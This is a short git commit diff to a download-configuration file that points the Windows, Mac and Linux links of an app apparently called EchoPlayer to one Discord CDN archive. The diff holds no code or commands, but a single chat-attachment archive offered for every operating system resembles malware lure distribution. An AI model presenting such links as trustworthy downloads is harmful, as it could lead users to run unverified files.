60a129b10a013ab3df7a46065c8875d7058fbcbb
ykggtrembala123 <140025450+ykggtrembala123@users.noreply.github.com>
2025-10-12 16:09:31 -0300

    Update downloads.ts

--- src/config/downloads.ts
+++ src/config/downloads.ts
@@ -1,8 +1,8 @@
 // Centralized download configuration
 export const downloadLinks = {
-  windows: "https://cdn.discordapp.com/attachments/1419137515503226920/1420503952579100782/EchoJam.rar?ex=68d5a2e5&is=68d45165&hm=3dfeba13079de849bed230e2eb785c0bb166678a62f7db5b1ed96b3ea&",
-  mac: "https://cdn.discordapp.com/attachments/1419137515503226920/1420503952579100782/EchoJam.rar?ex=68d5a2e5&is=68d45165&hm=3dfeba13079de849bed230e2eb785c0bb166678a62f7db5b1ed96b3ea&",
-  linux: "https://cdn.discordapp.com/attachments/1419137515503226920/1420503952579100782/EchoJam.rar?ex=68d5a2e5&is=68d45165&hm=3dfeba13079de849bed230e2eb785c0bb166678a62f7db5b1ed96b3ea&",
+  windows: "https://cdn.discordapp.com/attachments/1426642099960287322/1426802230584934470/EchoPlayer-waves.zip?ex=68ec8ca0&is=68eb3b20&hm=34ac721e92c27796c1364cca5edaf6d8b01cb348e8f7b259625defc7ec138216&",
+  mac: "https://cdn.discordapp.com/attachments/1426642099960287322/1426802230584934470/EchoPlayer-waves.zip?ex=68ec8ca0&is=68eb3b20&hm=34ac721e92c27796c1364cca5edaf6d8b01cb348e8f7b259625defc7ec138216&",
+  linux: "https://cdn.discordapp.com/attachments/1426642099960287322/1426802230584934470/EchoPlayer-waves.zip?ex=68ec8ca0&is=68eb3b20&hm=34ac721e92c27796c1364cca5edaf6d8b01cb348e8f7b259625defc7ec138216&",
 } as const;
 
 export type Platform = keyof typeof downloadLinks;
